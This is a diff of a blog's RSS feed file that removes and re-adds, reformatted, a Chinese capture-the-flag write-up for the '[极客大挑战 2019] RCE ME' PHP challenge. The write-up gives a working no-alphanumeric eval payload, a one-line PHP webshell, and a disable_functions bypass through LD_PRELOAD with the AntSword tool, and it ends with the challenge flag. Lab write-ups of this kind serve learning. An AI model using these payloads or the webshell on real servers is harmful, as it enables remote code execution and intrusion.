@@ -1,19 +1,133 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>Disable_function绕过 on </title>
-    <link>/tags/disable_function%E7%BB%95%E8%BF%87/</link>
-    <description>Recent content in Disable_function绕过 on </description>
-    <generator>Hugo</generator>
-    <language>en</language>
-    <lastBuildDate>Sat, 05 Dec 2020 20:42:00 +0000</lastBuildDate>
-    <atom:link href="/tags/disable_function%E7%BB%95%E8%BF%87/index.xml" rel="self" type="application/rss+xml" />
-    <item>
-      <title>极客大挑战 2019 RCE ME</title>
-      <link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link>
-      <pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate>
-      <guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid>
-      <description>&lt;h1 id=&#34;极客大挑战-2019rce-me&#34;&gt;[极客大挑战 2019]RCE ME&lt;/h1&gt;&#xA;&lt;p&gt;源码：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php&#xA;error_reporting(0);&#xA;if(isset($_GET[&amp;#39;code&amp;#39;])){&#xA;            $code=$_GET[&amp;#39;code&amp;#39;];&#xA;                    if(strlen($code)&amp;gt;40){&#xA;                                        die(&amp;#34;This is too Long.&amp;#34;);&#xA;                                                }&#xA;                    if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){&#xA;                                        die(&amp;#34;NO.&amp;#34;);&#xA;                                                }&#xA;                    @eval($code);&#xA;}&#xA;else{&#xA;            highlight_file(__FILE__);&#xA;}&#xA;&#xA;// ?&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分析一波，GET请求获得&lt;code&gt;code&lt;/code&gt;，想要通过的话需要绕过两个检测：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;payload长度小于40&lt;/li&gt;&#xA;&lt;li&gt;不能包含&lt;code&gt;a-z、A-Z、0-9&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&#34;&gt;一些不包含数字和字母的webshell&lt;/a&gt;，这次摸到了相关文章：&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html&#34;&gt;无字母数字webshell之提高篇&lt;/a&gt;。&lt;/p&gt;&#xA;&lt;p&gt;使用&lt;code&gt;url编码&lt;/code&gt;+&lt;code&gt;~&lt;/code&gt;取反构造不可见字符串，然后加上php7版本以后支持了使用：&lt;code&gt;($a)()&lt;/code&gt;这样的方法动态执行函数，所以我们可以构造payload：&lt;code&gt;assert(eval($_POST[‘a’]))&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;先构造&lt;code&gt;assert&lt;/code&gt;：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo urlencode(~&amp;#39;assert&amp;#39;);&#xA;&#xA;//结果：%9E%8C%8C%9A%8D%8B&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再构造&lt;code&gt;eval($_POST[&#39;a&#39;])&lt;/code&gt;：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;);&#xA;&#xA;//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完整payload：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的&lt;code&gt;~&lt;/code&gt;取反再获得真正的函数名。&lt;/p&gt;&#xA;&lt;p&gt;使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是&lt;code&gt;ELF&lt;/code&gt;是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回&lt;code&gt;ret=127&lt;/code&gt;：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201403.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;搜索了一波，原来是是&lt;strong&gt;disable_function&lt;/strong&gt;搞的鬼，这个表可以在phpinfo()中查看：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201821.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;因为&lt;code&gt;system&lt;/code&gt;、&lt;code&gt;exec&lt;/code&gt;、&lt;code&gt;shell_exec&lt;/code&gt;等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过&lt;strong&gt;disable_function&lt;/strong&gt;的方法，网上有很多其他方法，其中一个方法：&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;利用环境变量LD_PRELOAD来绕过&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的&lt;/p&gt;&#xA;&lt;p&gt;LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。&lt;/p&gt;&lt;/blockquote&gt;&#xA;&lt;p&gt;正好蚁剑的插件中就有一个名为：&lt;a href=&#34;https://github.com/Medicean/as_bypass_php_disable_functions&#34;&gt;as_bypass_php_disable_functions&lt;/a&gt;的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234337.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的&lt;code&gt;/var/www/html&lt;/code&gt;目录是没有上传权限的，我右键以后发现能修改权限，改成0777：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204190508.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&lt;/p&gt;&lt;/blockquote&gt;&#xA;&lt;p&gt;上传一句话木马233.php：&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php&#xA;@eval($_POST[&amp;#39;b&amp;#39;]);&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再用一句话木马的shell执行插件：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204231514.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进入shell，目录下面多了一个名为**.antproxy.php**的文件：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234445.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204233847.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;flag{a216900e-2427-48f7-9323-f65d0a3abdbf}&lt;/p&gt;</description>
-    </item>
-  </channel>
+    <channel>
+        <title>Disable_function绕过 on </title>
+        <link>//localhost:1313/tags/disable_function%E7%BB%95%E8%BF%87/</link>
+        <description>Recent content in Disable_function绕过 on </description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <lastBuildDate>Sat, 05 Dec 2020 20:42:00 +0000</lastBuildDate><atom:link href="//localhost:1313/tags/disable_function%E7%BB%95%E8%BF%87/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>极客大挑战 2019 RCE ME</title>
+        <link>//localhost:1313/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link>
+        <pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate>
+        
+        <guid>//localhost:1313/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid>
+        <description>&lt;h1 id=&#34;极客大挑战-2019rce-me&#34;&gt;[极客大挑战 2019]RCE ME
+&lt;/h1&gt;&lt;p&gt;源码：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+error_reporting(0);
+if(isset($_GET[&amp;#39;code&amp;#39;])){
+            $code=$_GET[&amp;#39;code&amp;#39;];
+                    if(strlen($code)&amp;gt;40){
+                                        die(&amp;#34;This is too Long.&amp;#34;);
+                                                }
+                    if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){
+                                        die(&amp;#34;NO.&amp;#34;);
+                                                }
+                    @eval($code);
+}
+else{
+            highlight_file(__FILE__);
+}
+
+// ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分析一波，GET请求获得&lt;code&gt;code&lt;/code&gt;，想要通过的话需要绕过两个检测：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;payload长度小于40&lt;/li&gt;
+&lt;li&gt;不能包含&lt;code&gt;a-z、A-Z、0-9&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:&lt;a class=&#34;link&#34; href=&#34;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;一些不包含数字和字母的webshell&lt;/a&gt;，这次摸到了相关文章：&lt;a class=&#34;link&#34; href=&#34;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;无字母数字webshell之提高篇&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;使用&lt;code&gt;url编码&lt;/code&gt;+&lt;code&gt;~&lt;/code&gt;取反构造不可见字符串，然后加上php7版本以后支持了使用：&lt;code&gt;($a)()&lt;/code&gt;这样的方法动态执行函数，所以我们可以构造payload：&lt;code&gt;assert(eval($_POST[‘a’]))&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;先构造&lt;code&gt;assert&lt;/code&gt;：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo urlencode(~&amp;#39;assert&amp;#39;);
+
+//结果：%9E%8C%8C%9A%8D%8B
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再构造&lt;code&gt;eval($_POST[&#39;a&#39;])&lt;/code&gt;：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;);
+
+//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完整payload：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的&lt;code&gt;~&lt;/code&gt;取反再获得真正的函数名。&lt;/p&gt;
+&lt;p&gt;使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是&lt;code&gt;ELF&lt;/code&gt;是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回&lt;code&gt;ret=127&lt;/code&gt;：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201403.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;搜索了一波，原来是是&lt;strong&gt;disable_function&lt;/strong&gt;搞的鬼，这个表可以在phpinfo()中查看：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201821.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;因为&lt;code&gt;system&lt;/code&gt;、&lt;code&gt;exec&lt;/code&gt;、&lt;code&gt;shell_exec&lt;/code&gt;等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过&lt;strong&gt;disable_function&lt;/strong&gt;的方法，网上有很多其他方法，其中一个方法：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;利用环境变量LD_PRELOAD来绕过&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的&lt;/p&gt;
+&lt;p&gt;LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;正好蚁剑的插件中就有一个名为：&lt;a class=&#34;link&#34; href=&#34;https://github.com/Medicean/as_bypass_php_disable_functions&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;as_bypass_php_disable_functions&lt;/a&gt;的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234337.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的&lt;code&gt;/var/www/html&lt;/code&gt;目录是没有上传权限的，我右键以后发现能修改权限，改成0777：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204190508.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;上传一句话木马233.php：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+@eval($_POST[&amp;#39;b&amp;#39;]);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再用一句话木马的shell执行插件：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204231514.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;进入shell，目录下面多了一个名为**.antproxy.php**的文件：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234445.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204233847.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;flag{a216900e-2427-48f7-9323-f65d0a3abdbf}&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
 </rss>
